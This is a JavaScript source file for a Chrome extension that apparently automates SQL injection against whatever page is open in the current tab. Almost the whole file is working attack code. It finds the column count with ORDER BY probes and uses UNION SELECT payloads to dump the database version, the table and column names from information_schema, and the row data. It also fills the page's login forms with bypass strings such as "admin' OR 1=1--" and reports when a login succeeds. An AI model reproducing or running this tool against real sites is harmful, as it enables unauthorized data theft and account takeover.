/*
* Get the current URL of the selected Chrome tab. Call to getCurrent
* By Javier Santos
* https://gist.github.com/javiersantos/c3e9ae2adba72e898f99
*/

var currentURL;

var newUrl;

var idName;

var tagName;

var idName2;

var tagName2;

var tableName;

var mostFrequentWord;

var allTables;

var allColumns;

var databaseName;

var versionName;

var columnInfomation = [];

var tableArray = [];

var columnArray = [];

var intOrderBy;
// payload array for username, password & form injection
var payloads = ["'", "admin' OR 1=1--", "admin'", "admin'--"];

// error array for username, password & form injection (when webpage returns SQL error with payload)
var errors = ["Syntax error:", "SQL syntax", "Lexical error"];

// login error array for username, password & form injection (when user is able to login with payload)
var loginErrors = ["Sign Off", "Log Off"];

// get the column number and html tag where database information will be nested
document.getElementById("start").addEventListener("click", function(){
  // getHTMLTag();
  enumerateColumn();
});
document.getElementById("tableBtn").addEventListener("click", enumerateTable);
document.getElementById("tableRow").addEventListener("click", getTableInput);
document.getElementById("tableInfo").addEventListener("click", enumerateTableInfo);
document.getElementById("tableColumnInfo").addEventListener("click", enumerateColumnInfo);
document.getElementById("getTableColumn").addEventListener("click", getColumnInfo);
document.getElementById("getInputField").addEventListener("click", getInputField);

chrome.tabs.query({'active': true, 'windowId': chrome.windows.WINDOW_ID_CURRENT}, 
function(tabs){
	getCurrentURL(tabs[0].url);
	window.location = currentURL;
});

function getCurrentURL(tab){
	currentURL = tab;
    document.getElementById("urlName").value=currentURL;
}
// URL SQLi
// enumerate webpage to find the number of columns
async function enumerateColumn() {
  var OrderBy = 1;
  var MaxOrderBy = 999;
  var getColumnNo = /mysql_fetch_array\(\)|internal server error/i;
  const urlError = /page not found/i;
  
  while (OrderBy <= MaxOrderBy) {
    newUrl = currentURL + "%20order%20by%20" + OrderBy;
    console.log(newUrl);
    
    try {
      const response = await fetch(newUrl);
      const data = await response.text();
      
      if (getColumnNo.test(data)) {
        console.log("Regex match found in: " + newUrl);
		    const columnNo = document.createElement("p");
		    intOrderBy = parseInt(OrderBy) - 1
		    const columnNoNode = document.createTextNode("Total column: " + intOrderBy.toString());
		    columnNo.appendChild(columnNoNode);
		    const element = document.getElementById('columnNo');
		    element.appendChild(columnNoNode);
		    console.log(parseInt(OrderBy)-1)
        break;
      }
      else if(response.status === 404){
        const errorMsg = document.createElement("p");
        const errorMsgNode = document.createTextNode("Please enter the error URL!");
        errorMsg.appendChild(errorMsgNode);
        const element = document.getElementById('columnNo');
        element.appendChild(errorMsg);
        break;
      }
    } catch (error) {
      const errorMsg = document.createElement("p");
      const errorMsgNode = document.createTextNode("Please enter the error URL!");
      errorMsg.appendChild(errorMsgNode);
      const element = document.getElementById('columnNo');
      element.appendChild(errorMsg);
    }
    OrderBy++;
  }
  enumerateDatabaseVersion();
  enumerateDatabase();
}

function getHTMLTag(){
  var splitUrl = currentURL.split('=');
  var baseUrl = splitUrl[0];

  newUrl = baseUrl + "=%27";

  console.log(newUrl);
  // const sqlData = /you\s+have\s+an\s+error\s+in\s+your\s+sql\s+syntax/i

  // const sqlData = /mysql_fetch_array()/i
  // const sqlData = /sql\s+syntax/i
  const sqlData = /error|sql syntax/i;
  fetch(newUrl)
  .then(response => response.text())
  .then(data => {
    const index = data.search(sqlData);
    const substring = data.substring(index - 50, index);
    console.log(substring);
    var tag = substring.match(/<(\w+)\s+.*?id=["'](\w+)["']/);
    console.log(tag);
    tagName = tag[1];
    idName = tag[2];
    console.log(tagName);
    console.log(idName);
  })
  .catch(error => console.log(error));
}

function enumerateDatabaseVersion(){
	var splitUrl = currentURL.split('=');
  var baseUrl = splitUrl[0];
  const payload = "group_concat(0x7b,0x7b,version(),0x7d,0x7d)";

	newUrl = baseUrl + "=-1%20union%20select%20"+generatePayloadLength(intOrderBy,payload)+"--"

	console.log(newUrl);
  fetch(newUrl)
  .then(response => response.text())
  .then(data => {
    // var doc = new DOMParser().parseFromString(data, "text/html");
    // const divContent = doc.getElementById(idName).innerHTML;
    // console.log(divContent);
    const textContent = data.replace(/<[^>]+>/g, " ");
    console.log(textContent);

        // Convert the content to an array of words
    const wordsMatch = textContent.match(/\{\{([^{}]+)\}\}/g);
    const wordCount = wordsMatch ? wordsMatch.length : 0;
    const wordValue = wordsMatch ? wordsMatch.map(match => match.replace(/\{\{|\}\}/g, "")) : [];

    const wordCountMap = {};
    for (let i = 0; i < wordValue.length; i++) {
      const word = wordValue[i];
      wordCountMap[word] = wordCountMap[word] ? wordCountMap[word] + 1 : 1;
    }
    let maxCount = 0;
    versionName = "";
    for (let word in wordCountMap) {
      if (wordCountMap[word] > maxCount) {
        maxCount = wordCountMap[word];
        versionName = word;
      }
    }

    // Output the most frequent word
    console.log(`The most frequent word is "${versionName}" with a count of ${maxCount}.`);
    const database = document.createElement("p");
    const databaseNode = document.createTextNode("Database version: " + versionName);
		database.appendChild(databaseNode);
		const element = document.getElementById('version');
    element.appendChild(databaseNode);
    console.log(versionName);
  })
  .catch(error => console.log(error));
}

function enumerateDatabase(){
	var splitUrl = currentURL.split('=');
  var baseUrl = splitUrl[0];
  const payload = "group_concat(0x7b,0x7b,database(),0x7d,0x7d)";

	newUrl = baseUrl + "=-1%20union%20select%20"+generatePayloadLength(intOrderBy,payload)+"--"

	console.log(newUrl);
  fetch(newUrl)
  .then(response => response.text())
  .then(data => {
    // var doc = new DOMParser().parseFromString(data, "text/html");
    // const divContent = doc.getElementById(idName).innerHTML;
    // console.log(divContent);
    const textContent = data.replace(/<[^>]+>/g, " ");
    console.log(textContent);

    // Convert the content to an array of words
    const wordsMatch = textContent.match(/\{\{([^{}]+)\}\}/g);
    const wordCount = wordsMatch ? wordsMatch.length : 0;
    const wordValue = wordsMatch ? wordsMatch.map(match => match.replace(/\{\{|\}\}/g, "")) : [];

    const wordCountMap = {};
    for (let i = 0; i < wordValue.length; i++) {
      const word = wordValue[i];
      wordCountMap[word] = wordCountMap[word] ? wordCountMap[word] + 1 : 1;
    }

    // Find the word with the highest count in the object
    let maxCount = 0;
    databaseName = "";
    for (const word in wordCountMap) {
      if (wordCountMap[word] > maxCount) {
        maxCount = wordCountMap[word];
        databaseName = word;
      }
    }

    // Output the most frequent word
    console.log(`The most frequent word is "${databaseName}" with a count of ${maxCount}.`);
    // const databaseName = /<h2[^>]*>(.*?)<\/h2>/i;
    // const checkDatabase = databaseName.exec(divContent);
    // const text = checkDatabase ? checkDatabase[1] : null;
    const database = document.createElement("p");
    const databaseNode = document.createTextNode("Database found: " + databaseName);
		database.appendChild(databaseNode);
		const element = document.getElementById('database');
    element.appendChild(databaseNode);
    console.log(databaseName);
  })
  .catch(error => console.log(error));
}

function enumerateTable(){
  var splitUrl = currentURL.split('=');
  var baseUrl = splitUrl[0];
  const payload = "concat(0x7b,0x7b,group_concat(table_name),0x7d,0x7d)";

  newUrl = baseUrl + "=-1%20union%20select%20"+generatePayloadLength(intOrderBy,payload)+"%20from%20information_schema.tables%20where%20table_schema=%27"+databaseName+"%27";

	console.log(newUrl);
  fetch(newUrl)
  .then(response => response.text())
  .then(data => {
    // var doc = new DOMParser().parseFromString(data, "text/html");
    // const divContent = doc.getElementById(idName).innerHTML;
    // console.log(divContent);
    const textContent = data.replace(/<[^>]+>/g, " ");
    console.log(textContent);
    const formContainer = document.getElementById("table-container");
    const wordsMatch = textContent.match(/\{\{([^{}]+)\}\}/g);
    const wordCount = wordsMatch ? wordsMatch.length : 0;
    const wordValue = wordsMatch ? wordsMatch.map(match => match.replace(/\{\{|\}\}/g, "")) : [];

    const wordCountMap = {};
    for (let i = 0; i < wordValue.length; i++) {
      const word = wordValue[i];
      wordCountMap[word] = wordCountMap[word] ? wordCountMap[word] + 1 : 1;
    }
    // Find the word with the highest count in the object
    let maxCount = 0;
    allTables = "";
    for (const word in wordCountMap) {
      if (wordCountMap[word] > maxCount) {
        maxCount = wordCountMap[word];
        allTables = word;
      }
    }

    // Output the most frequent word
    console.log(`The most frequent word is "${allTables}" with a count of ${maxCount}.`);
    tableArray = allTables.split(",");
    const table = document.getElementById('tableName');
    const tableTable = document.createElement("ul");
    console.log(tableArray);
    tableArray.forEach(tableName => {
       const tableList = document.createElement("li");
       const tableNameNode = document.createTextNode(tableName);
       tableList.appendChild(tableNameNode);
       tableTable.appendChild(tableList);
    })
    table.appendChild(tableTable);
            // Create a dropdown list
            const dropdown = document.createElement("select");
            dropdown.id = "table-dropdown";
    
            // Create options for the dropdown list
            const defaultOption = document.createElement("option");
            defaultOption.textContent = "Select a value";
            defaultOption.disabled = true;
            defaultOption.selected = true;
            dropdown.appendChild(defaultOption);
    
            tableArray.forEach(function(payload) {
              const option = document.createElement("option");
              option.textContent = payload;
              option.value = payload;
              dropdown.appendChild(option);
            });
          
            formContainer.appendChild(dropdown);

  })
  .catch(error => console.log(error));

}
function enumerateTableInfo(){
  var splitUrl = currentURL.split('=');
  var baseUrl = splitUrl[0];
  const payload = "concat(0x7b,0x7b,group_concat(column_name,0x3a,column_type),0x7d,0x7d)";
  
  newUrl = baseUrl + "=-1%20union%20select%20"+generatePayloadLength(intOrderBy,payload)+"%20from%20information_schema.columns%20where%20table_name=%27"+tableName+"%27";

	console.log(newUrl);
  fetch(newUrl)
  .then(response => response.text())
  .then(data => {
    // var doc = new DOMParser().parseFromString(data, "text/html");
    // const divContent = doc.getElementById(idName).innerHTML;
    // console.log(divContent);
    const textContent = data.replace(/<[^>]+>/g, " ");
    console.log(textContent);

        // Convert the content to an array of words
    const wordsMatch = textContent.match(/\{\{([^{}]+)\}\}/g);
    const wordCount = wordsMatch ? wordsMatch.length : 0;
    const wordValue = wordsMatch ? wordsMatch.map(match => match.replace(/\{\{|\}\}/g, "")) : [];

    const wordCountMap = {};
    for (let i = 0; i < wordValue.length; i++) {
      const word = wordValue[i];
      wordCountMap[word] = wordCountMap[word] ? wordCountMap[word] + 1 : 1;
    }
    // Find the word with the highest count in the object
    let maxCount = 0;
    allColumns = "";
    for (const word in wordCountMap) {
      if (wordCountMap[word] > maxCount) {
        maxCount = wordCountMap[word];
        allColumns = word;
      }
    }

    // Output the most frequent word
    console.log(`The most frequent word is "${allColumns}" with a count of ${maxCount}.`);
    
    columnArray = allColumns.split(",");
    const table = document.getElementById('table');
    const tableTable = document.createElement("tr");
    const tableColumn = document.createElement("th");
    const tableType = document.createElement("th");
    const columnName = document.createTextNode("Column");
    const typeName = document.createTextNode("Type");
    tableColumn.appendChild(columnName);
    tableType.appendChild(typeName);
    tableTable.appendChild(tableColumn);
    tableTable.appendChild(tableType);
    table.appendChild(tableTable);
    columnArray.forEach((allColumns) => {
      const[column, type] = allColumns.split(":");
      const tableTable = document.createElement("tr");
      const tableColumn = document.createElement("td");
      const tableType = document.createElement("td");
      const columnName = document.createTextNode(column);
      const typeName = document.createTextNode(type);
      tableColumn.appendChild(columnName);
      tableType.appendChild(typeName);

      const tableCheckbox = document.createElement("td");
      const checkbox = document.createElement("input");
      checkbox.type = "checkbox";
      checkbox.name = "checkbox";
      checkbox.value = column;
      tableCheckbox.appendChild(checkbox);

      tableTable.appendChild(tableColumn);
      tableTable.appendChild(tableType);
      tableTable.appendChild(tableCheckbox);
      table.appendChild(tableTable);
      
    })
    const database = document.createElement("p");
    const databaseNode = document.createTextNode("Columns in " + tableName+": " + allColumns);
		database.appendChild(databaseNode);
		const element = document.getElementById('database');
    element.appendChild(database);
    console.log(allColumns);
  })
  .catch(error => console.log(error));
  
}
function enumerateColumnInfo(){
  var splitUrl = currentURL.split('=');
  var baseUrl = splitUrl[0];
  console.log(columnInfomation); 
  // const splitColumnInfomation = columnInfomation.split(',');
  const table = document.getElementById('tables');
  const tableColumnHeader = document.createElement('tr');

    let i = 0;
    while(i < columnInfomation.length){
      const tableColumnHeaderCell = document.createElement('th');
      const tableColumnHeaderText = document.createTextNode(columnInfomation[i]);
      
      tableColumnHeaderCell.appendChild(tableColumnHeaderText);
      tableColumnHeader.appendChild(tableColumnHeaderCell);
      // console.log(splitColumnInfomation[i]);
      i++;
    }
    table.appendChild(tableColumnHeader);

  const newColumnInformation = columnInfomation.map(item => `${item},0x3a`).join(',');
  const modifiedColumnInformation = newColumnInformation.replace(/(.*)(0x3a)/, '$1' + '0x3b');
  console.log(newColumnInformation); 
  console.log(modifiedColumnInformation);
  const payload = "concat(0x7b,0x7b,group_concat("+modifiedColumnInformation+"),0x2c,0x7d,0x7d)"

  newUrl = baseUrl + "=-1%20union%20select%20"+generatePayloadLength(intOrderBy,payload)+"%20from%20"+tableName;

	console.log(newUrl);
  fetch(newUrl)
  .then(response => response.text())
  .then(data => {
    // var doc = new DOMParser().parseFromString(data, "text/html");
    // const divContent = doc.getElementById(idName).innerHTML;
    // console.log(divContent);
    const textContent = data.replace(/<[^>]+>/g, " ");
    console.log(textContent);


    const wordsMatch = textContent.match(/\{\{([^{}]+)\}\}/g);
    const wordCount = wordsMatch ? wordsMatch.length : 0;
    const wordValue = wordsMatch ? wordsMatch.map(match => match.replace(/\{\{|\}\}/g, "")) : [];

    const wordCountMap = {};
    for (let i = 0; i < wordValue.length; i++) {
      const word = wordValue[i];
      wordCountMap[word] = wordCountMap[word] ? wordCountMap[word] + 1 : 1;
    }
    // Find the word with the highest count in the object
    let maxCount = 0;
    mostFrequentWord = "";
    for (const word in wordCountMap) {
      if (wordCountMap[word] > maxCount) {
        maxCount = wordCountMap[word];
        mostFrequentWord = word;
      }
    }

    // Output the most frequent word
    console.log(`The most frequent word is "${mostFrequentWord}" with a count of ${maxCount}.`);
    
    const database = document.createElement("p");
    const databaseNode = document.createTextNode("Table found: " + mostFrequentWord);
		database.appendChild(databaseNode);
		const element = document.getElementById('database');
    element.appendChild(database);
    console.log(mostFrequentWord);

    const tableRow = mostFrequentWord.split(";,");
    const table = document.getElementById('tables');
    tableRow.forEach(row => {
      const column = row.split(":");
      const newRow = document.createElement("tr");
      column.forEach(col =>{
        const newCell = document.createElement("td");
        const cellTextNode = document.createTextNode(col);
        newCell.appendChild(cellTextNode);
        newRow.appendChild(newCell);
      })
      table.appendChild(newRow);
    });
    columnInfomation = [];
    //table.appendChild(newRow);
  })
  .catch(error => console.log(error));
  
}
function getColumnInfo(){
  // const columnField = document.getElementById('table');
  // columnInfomation = columnField.value;
  const checkboxes = document.getElementsByName("checkbox");
  const selectedCheckboxes = [];

  checkboxes.forEach((checkbox) => {
    if (checkbox.checked) {
      columnInfomation.push(checkbox.value);
    }
  });
  console.log(columnInfomation);
  return selectedCheckboxes;
}
function getTableInput(){
  const tableField = document.getElementById('table-dropdown');
  tableName = tableField.value;
}
function generatePayloadLength(columnNumber, payload){
  const payloadArray = new Array(columnNumber).fill(payload);
  return payloadArray.join(",");
}
function removeTable(elementId){
  const element = document.getElementById(elementId);
  if(element.hasChildNodes()){
    const table = element.getElementsByTagName('table')[0];
    element.removeChild(table);
  }
}

// form SQLi

function getInputField(){
  fetch(currentURL)
    .then(response => response.text())
    .then(data => {
      // Create a new HTML document from the retrieved content
      const doc = new DOMParser().parseFromString(data, "text/html");
      const formContain = document.getElementById("form-container");
      // Get all the form elements on the webpage
      const formElements = doc.getElementsByTagName("form");
      // Iterate over each form element and create a separate container for each form
      for (let i = 0; i < formElements.length; i++) {
        const form = formElements[i];
        const formContainer = document.createElement("div");
        formContainer.id = form.id;
        // Enumerate the input fields and add them to the form container
        const inputFields = form.getElementsByTagName("input");
        for (let j = 0; j < inputFields.length; j++) {
          const inputField = inputFields[j];
          if (inputField.type === "text" || inputField.type === "password") {
            // Create a new input field in the extension
            const inputElement = document.createElement("input");
            inputElement.type = "text";
            inputElement.placeholder = inputField.name;
            inputElement.id = inputField.id;
            // Create a dropdown list
            const dropdown = document.createElement("select");
            dropdown.id = inputField.id + "-dropdown";

            // Create options for the dropdown list
            const defaultOption = document.createElement("option");
            defaultOption.textContent = "Select a value";
            defaultOption.disabled = true;
            defaultOption.selected = true;
            dropdown.appendChild(defaultOption);

            payloads.forEach(function (payload) {
              const option = document.createElement("option");
              option.textContent = payload;
              dropdown.appendChild(option);
            });

            // Add an event listener to the dropdown list to update the corresponding input field when an option is selected
            dropdown.addEventListener("change", function () {
              inputElement.value = this.value;
            });
            const inputContainer = document.createElement("div");
            inputContainer.appendChild(dropdown);
            inputContainer.appendChild(inputElement);
            formContainer.appendChild(inputContainer);
          }
        }

        // Create a button to update the input fields on the webpage
        const updateButton = document.createElement("button");
        updateButton.textContent = "Scan SQLi vulnerability!";
        updateButton.addEventListener("click", function () {
          const formContainer = this.parentNode;
          checkSQLInjection(formContainer.id);
        });

        // Add the button to the form container
        formContainer.appendChild(updateButton);

        // Add the form container to the page
        formContain.appendChild(formContainer);
      }
    })
    .catch(error => console.log(error));
    
}
function checkSQLInjection(formContainer) {
  fetch(currentURL)
  .then(function(response) {
    return response.text();
  })
  .then(function(html) {
    // create a dummy DOM element to parse the HTML string
    const parser = new DOMParser();
    console.log(formContainer);
    const doc = parser.parseFromString(html, 'text/html');
    // get the login form and add a submit event listener to intercept the submission
    const loginForm = doc.getElementById(formContainer);
    console.log(loginForm);
    const loginAction = new URL(loginForm.action).pathname;
    console.log(loginAction);
    // if(loginAction.includes('.')){

    // }
    // else{}
    const splitUrl = currentURL.split('/');
    const domain = splitUrl.slice(0, -1).join('/');
    const page = splitUrl[splitUrl.length - 1];
    let newUrl = "";  
    if(loginAction.includes('.')){
      const fileExtension = loginAction.split('.').pop();
      if(fileExtension === 'php' || fileExtension === 'com' || fileExtension === 'jsp'){
        newUrl = domain + loginAction;
      }
      else{
        newUrl = domain + loginAction;
      }
    }
    else{
      newUrl = domain + loginAction;
    }
    console.log(newUrl);
    const inputFields = loginForm.querySelectorAll('input[type=text], input[type=password], input[type=email]');

    console.log(inputFields);
    const payloadObj = {};
    inputFields.forEach(function(input){
      const inputName = input.getAttribute('name');
      const inputValue = document.getElementById(inputName).value;
      input.value = inputValue;
      payloadObj[inputName] = inputValue;
    })
    const buttonFields = loginForm.querySelector('input[type=submit]')
    const buttonName = buttonFields.getAttribute('name');
    const buttonValue = buttonFields.value;
    if(!buttonName){
      
    }
    else{
      payloadObj[buttonName] = buttonValue;
    }
    // set the input values

    // create a new XMLHttpRequest object
    const xhr = new XMLHttpRequest();
    console.log(xhr);
    // set the URL to doLogin
    // const url = 'https://demo.testfire.net/doLogin';
  
    // set the request method to POST
    xhr.open('POST', newUrl);
  
    // set the request header to send form data
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  
    // create the payload with the injected SQL code
    // convert the payload object to a string
    const payloadStr = Object.keys(payloadObj).map(key => {
      return encodeURIComponent(key) + '=' + encodeURIComponent(payloadObj[key]);
    }).join('&');
    console.log(payloadStr);
    // add an event listener to handle the response
    xhr.addEventListener('load', function() {
      // get the response text and log it
      const responseText = xhr.responseText;
      const responseUrl = xhr.responseURL;
      let responseErrorText = ""
      console.log(responseText);
      if (errors.some(error => responseText.toLowerCase().includes(error.toLowerCase()))) {
        // loop over the payload object and search for the name or ID of each input field
        Object.keys(payloadObj).forEach(function(key) {
          const fieldValue = payloadObj[key];
          const fieldName = key.toLowerCase();
          if (payloads.includes(fieldValue)) {
          // check if the response text contains the name or ID of the input field
            // if (responseText.includes(fieldName)) {
              responseErrorText = 'Potential vulnerability found in ' + fieldName + ' field with payload "' + fieldValue +'"!';
              // console.log('Potential vulnerability found in ' + fieldName + ' field with payload "' + fieldValue +'"!');
            // }
          }
        });
      }
      else if(responseUrl !== currentURL){
        if(loginErrors.some(loginErrors => responseText.toLowerCase().includes(loginErrors.toLowerCase()))){
          Object.keys(payloadObj).forEach(function(key) {
            const fieldValue = payloadObj[key];
            const fieldName = key.toLowerCase();         
            if (payloads.includes(fieldValue)) {
              console.log(fieldValue);
              console.log(fieldName);
              responseErrorText = 'Log in to '+ responseUrl + ' from ' + fieldName + ' field with payload "' + fieldValue +'"!';
              console.log('Log in to '+ responseUrl + 'with' + fieldName + ' field with payload "' + fieldValue +'"!');
            }
          });
        }
        else{
          Object.keys(payloadObj).forEach(function(key) {
            const fieldValue = payloadObj[key];
            const fieldName = key.toLowerCase();         
            if (payloads.includes(fieldValue)) {
              console.log(fieldValue);
              console.log(fieldName);
              responseErrorText = 'Redirected to '+ responseUrl + ' from ' + fieldName + ' field with payload "' + fieldValue +'"!';
              console.log('Redirected to '+ responseUrl + 'with' + fieldName + ' field with payload "' + fieldValue +'"!');
            }
          });
        }
      }
      else{
          console.log('')
      }
      const responseError = document.createElement("p");
      const responseErrorNode = document.createTextNode(responseErrorText);
      responseError.appendChild(responseErrorNode);
      const element = document.getElementById('responseError');
      element.appendChild(responseError);
    });
    // send the payload and submit the form
    xhr.send(payloadStr);
    loginForm.submit();
    setTimeout(() => {
      xhr.abort();
    }, 5000);
  })
  .catch(function(error) {
    console.log(error);
  });
}
